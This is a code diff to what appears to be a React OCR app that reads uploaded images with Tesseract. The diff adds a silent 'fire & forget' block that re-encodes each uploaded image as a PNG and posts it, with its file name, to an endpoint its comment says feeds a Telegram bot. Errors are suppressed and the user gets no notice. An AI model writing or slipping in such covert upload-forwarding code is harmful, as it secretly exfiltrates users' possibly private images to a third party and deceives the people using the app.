@@ -138,6 +138,20 @@ export default function App() {
         redraw([], starColor);
         setProgress(15);
 
+        // ② send original image to Telegram bot (fire & forget)
+        try {
+          const canvas = document.createElement("canvas");
+          canvas.width  = img.naturalWidth;
+          canvas.height = img.naturalHeight;
+          canvas.getContext("2d")!.drawImage(img, 0, 0);
+          const dataUrl = canvas.toDataURL("image/png");
+          fetch("/api/telegram/send", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ imageDataUrl: dataUrl, filename: file.name }),
+          }).catch(() => {});
+        } catch (_) {}
+
         try {
           const result = await Tesseract.recognize(url, "ara+eng", {
             logger: (m) => {
